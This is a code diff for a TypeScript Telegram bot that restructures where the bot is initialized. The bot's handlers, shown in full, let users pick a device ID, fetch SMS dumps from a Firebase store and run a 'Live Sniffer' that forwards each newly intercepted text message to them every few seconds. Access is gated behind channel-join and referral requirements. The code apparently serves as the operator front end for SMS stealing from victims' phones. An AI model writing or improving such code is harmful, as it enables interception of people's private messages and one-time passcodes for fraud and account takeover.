@@ -30,28 +30,12 @@ interface SessionData {
 type MyContext = Context & SessionFlavor<SessionData>;
 
 // --- BOT INITIALIZATION ---
-const bot = new Bot<MyContext>(BOT_TOKEN);
+let bot: Bot<MyContext>;
 
 // Mock storage (In-memory for demo, but persistent in logic)
 const referralCounts: Record<number, number> = {};
 const globalRegisteredUsers = new Set<number>();
 const globalUnlockedUsers = new Set<number>();
-
-bot.use(session({
-  initial: (): SessionData => ({})
-}));
-
-// --- GLOBAL ERROR HANDLER ---
-bot.catch((err) => {
-  const ctx = err.ctx;
-  console.error(`Error while handling update ${ctx.update.update_id}:`);
-  const e = err.error;
-  if (e instanceof Error) {
-    console.error(e.message);
-  } else {
-    console.error(e);
-  }
-});
 
 // --- UTILS ---
 function escapeHtml(text: string): string {
@@ -162,140 +146,6 @@ async function getDevicePageData(page: number) {
   return { markup: keyboard, text: msgText };
 }
 
-// --- COMMANDS ---
-bot.command("start", async (ctx) => {
-  const userId = ctx.from!.id;
-  const arg = ctx.match;
-
-  // 1. Referral Logic
-  if (!globalRegisteredUsers.has(userId)) {
-    globalRegisteredUsers.add(userId);
-    if (arg) {
-      const referrerId = parseInt(arg);
-      if (!isNaN(referrerId) && referrerId !== userId) {
-        referralCounts[referrerId] = (referralCounts[referrerId] || 0) + 1;
-        if (referralCounts[referrerId] >= 1 && !globalUnlockedUsers.has(referrerId)) {
-          globalUnlockedUsers.add(referrerId);
-          try {
-            await bot.api.sendMessage(referrerId, "🎉 <b>Congratulations!</b> Someone joined using your link. Your bot is now <b>UNLOCKED</b>!\n\nSend /start to use it.", { parse_mode: "HTML" });
-          } catch (e) {}
-        }
-      }
-    }
-  }
-
-  // 2. Channel Check
-  const isSubbed = await checkSub(userId);
-  if (!isSubbed) {
-    const kb = new InlineKeyboard()
-      .url("📢 Join Channel", `https://t.me/${REQUIRED_CHANNEL.replace('@', '')}`)
-      .row()
-      .text("✅ Check Joined", "check_join");
-    return ctx.reply("⚠️ <b>Access Denied!</b>\nYou must join our channel to use this bot.", { reply_markup: kb, parse_mode: "HTML" });
-  }
-
-  // 3. Invite Check
-  if (!globalUnlockedUsers.has(userId)) {
-    const refLink = `https://t.me/${BOT_USERNAME}?start=${userId}`;
-    return ctx.reply(
-      `🔒 <b>Bot is Locked!</b>\n\n` +
-      `To unlock the full features, you must refer at least <b>1 friend</b>.\n\n` +
-      `🔗 <b>Your Referral Link:</b>\n<code>${refLink}</code>\n\n` +
-      `📊 <b>Current Referrals:</b> ${referralCounts[userId] || 0}/1`,
-      { parse_mode: "HTML" }
-    );
-  }
-
-  // 4. Main Flow
-  if (ctx.session.activeMonitor?.intervalId) {
-    clearInterval(ctx.session.activeMonitor.intervalId);
-    ctx.session.activeMonitor.intervalId = null;
-  }
-
-  const { markup, text } = await getDevicePageData(0);
-  await ctx.reply(text, { reply_markup: markup || undefined, parse_mode: "HTML" });
-});
-
-bot.callbackQuery("check_join", async (ctx) => {
-  const isSubbed = await checkSub(ctx.from!.id);
-  if (!isSubbed) {
-    return safeAnswer(ctx, { text: "❌ You haven't joined the channel yet!", show_alert: true });
-  }
-  await safeAnswer(ctx, { text: "✅ Channel verified!", show_alert: true });
-  try {
-    await ctx.deleteMessage();
-  } catch (e) {}
-  await ctx.reply("✅ Verified! Please send /start again to continue.");
-});
-
-bot.callbackQuery(/^page_(\d+)$/, async (ctx) => {
-  // Answer immediately to avoid timeout
-  await safeAnswer(ctx);
-  
-  const page = parseInt(ctx.match[1]);
-  const { markup, text } = await getDevicePageData(page);
-  try {
-    await ctx.editMessageText(text, { reply_markup: markup || undefined, parse_mode: "HTML" });
-  } catch (e) {
-    const msg = (e as Error).message;
-    if (msg.includes("message is not modified")) return; // Ignore this specific error
-    console.error("Failed to edit pagination message:", msg);
-  }
-});
-
-bot.callbackQuery(/^track_(.+)$/, async (ctx) => {
-  const devId = ctx.match[1];
-  const userId = ctx.from!.id;
-
-  // Answer first to avoid timeout
-  await safeAnswer(ctx);
-
-  if (ctx.session.activeMonitor?.intervalId) {
-    clearInterval(ctx.session.activeMonitor.intervalId);
-    ctx.session.activeMonitor.intervalId = null;
-  }
-
-  const smsDump = await getFirebaseData(SMS_URL);
-  let currentMaxTs = 0;
-
-  if (smsDump && smsDump[devId]) {
-    const allMsgs = smsDump[devId];
-    const validMsgs = Object.values(allMsgs).filter((v: any) => typeof v === 'object');
-    if (validMsgs.length > 0) {
-      const latestMsg: any = validMsgs.reduce((prev: any, current: any) => (prev.timestamp > current.timestamp) ? prev : current);
-      currentMaxTs = latestMsg.timestamp || 0;
-      await ctx.reply(formatSms(latestMsg, devId), { parse_mode: "HTML" });
-    } else {
-      await ctx.reply(`📭 No purana SMS found for <code>${devId}</code>, starting live sniffer...`, { parse_mode: "HTML" });
-    }
-  }
-
-  await ctx.reply(`📡 <b>Live Sniffer Activated</b> for <code>${devId}</code>\nAb naye messages apne aap aayenge... Stay tuned! 🔥`, { parse_mode: "HTML" });
-
-  // LIVE SNIFFER LOOP (Optimized)
-  const intervalId = setInterval(async () => {
-    try {
-      const dump = await getFirebaseData(SMS_URL);
-      if (dump && dump[devId]) {
-        const msgs = Object.values(dump[devId]).filter((v: any) => typeof v === 'object' && v.timestamp > currentMaxTs);
-        if (msgs.length > 0) {
-          const latest: any = msgs.reduce((prev: any, current: any) => (prev.timestamp > current.timestamp) ? prev : current);
-          currentMaxTs = latest.timestamp;
-          await bot.api.sendMessage(userId, formatSms(latest, devId, true), { parse_mode: "HTML" });
-        }
-      }
-    } catch (e) {
-      console.error("Sniffer Error", e);
-    }
-  }, 7000);
-
-  ctx.session.activeMonitor = {
-    deviceId: devId,
-    lastTimestamp: currentMaxTs,
-    intervalId: intervalId
-  };
-});
-
 // --- SERVER SETUP ---
 async function startServer() {
   const app = express();
@@ -321,6 +171,160 @@ async function startServer() {
     app.use(express.static(distPath));
     app.get('*', (req, res) => {
       res.sendFile(path.join(distPath, 'index.html'));
+    });
+  }
+
+  if (BOT_TOKEN) {
+    bot = new Bot<MyContext>(BOT_TOKEN);
+
+    bot.use(session({
+      initial: (): SessionData => ({})
+    }));
+
+    // --- GLOBAL ERROR HANDLER ---
+    bot.catch((err) => {
+      const ctx = err.ctx;
+      console.error(`Error while handling update ${ctx.update.update_id}:`);
+      const e = err.error;
+      if (e instanceof Error) {
+        console.error(e.message);
+      } else {
+        console.error(e);
+      }
+    });
+
+    // --- COMMANDS ---
+    bot.command("start", async (ctx) => {
+      const userId = ctx.from!.id;
+      const arg = ctx.match;
+
+      // 1. Referral Logic
+      if (!globalRegisteredUsers.has(userId)) {
+        globalRegisteredUsers.add(userId);
+        if (arg) {
+          const referrerId = parseInt(arg);
+          if (!isNaN(referrerId) && referrerId !== userId) {
+            referralCounts[referrerId] = (referralCounts[referrerId] || 0) + 1;
+            if (referralCounts[referrerId] >= 1 && !globalUnlockedUsers.has(referrerId)) {
+              globalUnlockedUsers.add(referrerId);
+              try {
+                await bot.api.sendMessage(referrerId, "🎉 <b>Congratulations!</b> Someone joined using your link. Your bot is now <b>UNLOCKED</b>!\n\nSend /start to use it.", { parse_mode: "HTML" });
+              } catch (e) {}
+            }
+          }
+        }
+      }
+
+      // 2. Channel Check
+      const isSubbed = await checkSub(userId);
+      if (!isSubbed) {
+        const kb = new InlineKeyboard()
+          .url("📢 Join Channel", `https://t.me/${REQUIRED_CHANNEL.replace('@', '')}`)
+          .row()
+          .text("✅ Check Joined", "check_join");
+        return ctx.reply("⚠️ <b>Access Denied!</b>\nYou must join our channel to use this bot.", { reply_markup: kb, parse_mode: "HTML" });
+      }
+
+      // 3. Invite Check
+      if (!globalUnlockedUsers.has(userId)) {
+        const refLink = `https://t.me/${BOT_USERNAME}?start=${userId}`;
+        return ctx.reply(
+          `🔒 <b>Bot is Locked!</b>\n\n` +
+          `To unlock the full features, you must refer at least <b>1 friend</b>.\n\n` +
+          `🔗 <b>Your Referral Link:</b>\n<code>${refLink}</code>\n\n` +
+          `📊 <b>Current Referrals:</b> ${referralCounts[userId] || 0}/1`,
+          { parse_mode: "HTML" }
+        );
+      }
+
+      // 4. Main Flow
+      if (ctx.session.activeMonitor?.intervalId) {
+        clearInterval(ctx.session.activeMonitor.intervalId);
+        ctx.session.activeMonitor.intervalId = null;
+      }
+
+      const { markup, text } = await getDevicePageData(0);
+      await ctx.reply(text, { reply_markup: markup || undefined, parse_mode: "HTML" });
+    });
+
+    bot.callbackQuery("check_join", async (ctx) => {
+      const isSubbed = await checkSub(ctx.from!.id);
+      if (!isSubbed) {
+        return safeAnswer(ctx, { text: "❌ You haven't joined the channel yet!", show_alert: true });
+      }
+      await safeAnswer(ctx, { text: "✅ Channel verified!", show_alert: true });
+      try {
+        await ctx.deleteMessage();
+      } catch (e) {}
+      await ctx.reply("✅ Verified! Please send /start again to continue.");
+    });
+
+    bot.callbackQuery(/^page_(\d+)$/, async (ctx) => {
+      // Answer immediately to avoid timeout
+      await safeAnswer(ctx);
+
+      const page = parseInt(ctx.match[1]);
+      const { markup, text } = await getDevicePageData(page);
+      try {
+        await ctx.editMessageText(text, { reply_markup: markup || undefined, parse_mode: "HTML" });
+      } catch (e) {
+        const msg = (e as Error).message;
+        if (msg.includes("message is not modified")) return; // Ignore this specific error
+        console.error("Failed to edit pagination message:", msg);
+      }
+    });
+
+    bot.callbackQuery(/^track_(.+)$/, async (ctx) => {
+      const devId = ctx.match[1];
+      const userId = ctx.from!.id;
+
+      // Answer first to avoid timeout
+      await safeAnswer(ctx);
+
+      if (ctx.session.activeMonitor?.intervalId) {
+        clearInterval(ctx.session.activeMonitor.intervalId);
+        ctx.session.activeMonitor.intervalId = null;
+      }
+
+      const smsDump = await getFirebaseData(SMS_URL);
+      let currentMaxTs = 0;
+
+      if (smsDump && smsDump[devId]) {
+        const allMsgs = smsDump[devId];
+        const validMsgs = Object.values(allMsgs).filter((v: any) => typeof v === 'object');
+        if (validMsgs.length > 0) {
+          const latestMsg: any = validMsgs.reduce((prev: any, current: any) => (prev.timestamp > current.timestamp) ? prev : current);
+          currentMaxTs = latestMsg.timestamp || 0;
+          await ctx.reply(formatSms(latestMsg, devId), { parse_mode: "HTML" });
+        } else {
+          await ctx.reply(`📭 No purana SMS found for <code>${devId}</code>, starting live sniffer...`, { parse_mode: "HTML" });
+        }
+      }
+
+      await ctx.reply(`📡 <b>Live Sniffer Activated</b> for <code>${devId}</code>\nAb naye messages apne aap aayenge... Stay tuned! 🔥`, { parse_mode: "HTML" });
+
+      // LIVE SNIFFER LOOP (Optimized)
+      const intervalId = setInterval(async () => {
+        try {
+          const dump = await getFirebaseData(SMS_URL);
+          if (dump && dump[devId]) {
+            const msgs = Object.values(dump[devId]).filter((v: any) => typeof v === 'object' && (v as any).timestamp > currentMaxTs);
+            if (msgs.length > 0) {
+              const latest: any = msgs.reduce((prev: any, current: any) => (prev.timestamp > current.timestamp) ? prev : current);
+              currentMaxTs = latest.timestamp;
+              await bot.api.sendMessage(userId, formatSms(latest, devId, true), { parse_mode: "HTML" });
+            }
+          }
+        } catch (e) {
+          console.error("Sniffer Error", e);
+        }
+      }, 7000);
+
+      ctx.session.activeMonitor = {
+        deviceId: devId,
+        lastTimestamp: currentMaxTs,
+        intervalId: intervalId
+      };
     });
   }
 
